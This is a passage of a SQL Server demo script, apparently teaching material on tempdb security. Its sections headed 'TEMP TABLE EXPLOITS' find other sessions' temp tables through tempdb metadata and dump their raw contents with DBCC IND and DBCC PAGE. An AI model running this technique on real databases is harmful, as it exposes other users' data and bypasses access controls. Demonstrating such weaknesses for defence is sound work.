    GRANT SELECT ON dbo.CatSongs TO Public;


	-- Create a temp table as TopCat People and as Garfield 
	-- (use different connections)
	-- START
	EXECUTE AS USER = 'Tolosano';
    
	SELECT *, CURRENT_USER AS TempTableUser
	INTO #KinfdomHackTable
	FROM dbo.Kingdoms;

	SELECT *, CURRENT_USER AS SelectUser FROM #KinfdomHackTable;

    REVERT; -- Go back to connection default user
    -- END
	
	--Open new Query

	-- Now as DBO...
	SELECT *, CURRENT_USER AS SelectUser FROM #KinfdomHackTable; -- FAIL!


--  +-------------------------------------------------------------+
--  | TEMPDB TEMP TABLE EXPLOITS - METADATA                       |
--  +-------------------------------------------------------------+

	EXECUTE AS USER = 'Agila';

	-- Get all tables names and some info
	SELECT * 
	FROM   TempDB.Sys.SysObjects
	WHERE  xtype  =    'U' 
	   AND [name] LIKE '%Hack%';


	-- Get number of records on those tables
	SELECT * 
	FROM   TempDB.Sys.Partitions
	WHERE  [object_id] IN (	SELECT id 
							FROM   TempDB.Sys.SysObjects
							WHERE  xtype  =    'U' 
							   AND [name] LIKE '%Hack%'
					      );


	-- Get columns in those tables
	SELECT * 
	FROM   TempDB.Sys.All_Columns
	WHERE  [object_id] IN (	SELECT id 
							FROM   TempDB.Sys.SysObjects
							WHERE  xtype  =    'U' 
							   AND [name] LIKE '%Hack%'
					      );

	REVERT; 

--  +-------------------------------------------------------------+
--  | TEMPDB TEMP TABLE EXPLOITS - DATA!                          |
--  +-------------------------------------------------------------+
						  					  
	-- Party preparation
	DROP TABLE IF EXISTS #StorageInfo;

	CREATE TABLE #StorageInfo
	(
		PageFID         BIGINT        NULL,
		PagePID         BIGINT        NULL,
		IAMFID          BIGINT        NULL,
		IAMPID          BIGINT        NULL,
		ObjectID        BIGINT        NULL,
		IndexID         BIGINT        NULL,
		PartitionNumber BIGINT        NULL,
		PartitionID     BIGINT        NULL,
		iam_chain_type  NVARCHAR(MAX) NULL,
		PageType        BIGINT        NULL,
		IndexLevel      BIGINT        NULL,
		NextPageFID     BIGINT        NULL,
		NextPagePID     BIGINT        NULL,
		PrevPageFID     BIGINT        NULL,
		PrevPagePID     BIGINT        NULL
    );
	

	-- BOOGIE NIGHTS!!!!
	
	DECLARE @ID INT;
	SET @ID = (	SELECT TOP (1) id 
				FROM   TempDB.Sys.SysObjects
				WHERE  xtype  =    'U' 
			       AND [name] LIKE '%Hack%'
			  );
	SELECT 'Table ID is...', @ID; -- One of the temp table's ID
	                              -- Remember that the TOP (1) only selected one!
	

	-- Get storage location into a table 
	INSERT INTO #StorageInfo
	EXEC ('DBCC IND(''TEMPDB'', ' + @ID + ', -1) WITH TABLERESULTS');

	SELECT * FROM #StorageInfo; -- Show it
	

	-- It's a kind of Magic!
	DBCC TRACEON (3604);


	-- Get data!
	DECLARE @PageFID BIGINT;
	DECLARE @PagePID BIGINT;
	DECLARE cur CURSOR FOR  SELECT PageFID, 
	                               PagePID 
	                        FROM   #StorageInfo;

    OPEN cur;   
	FETCH NEXT FROM cur INTO @PageFID, @PagePID;  

	WHILE @@FETCH_STATUS = 0   
	BEGIN   
		   DBCC PAGE (TEMPDB, @PageFID, @PagePID, 3) WITH TABLERESULTS;

		   FETCH NEXT FROM cur INTO @PageFID, @PagePID   
	END   

	CLOSE cur;
	DEALLOCATE cur;


--  +----------------------------------------------------------------+
--  | Playtime is over.                                              |
--  | Now it's time for a cat nap!                                   |
--  +----------------------------------------------------------------+
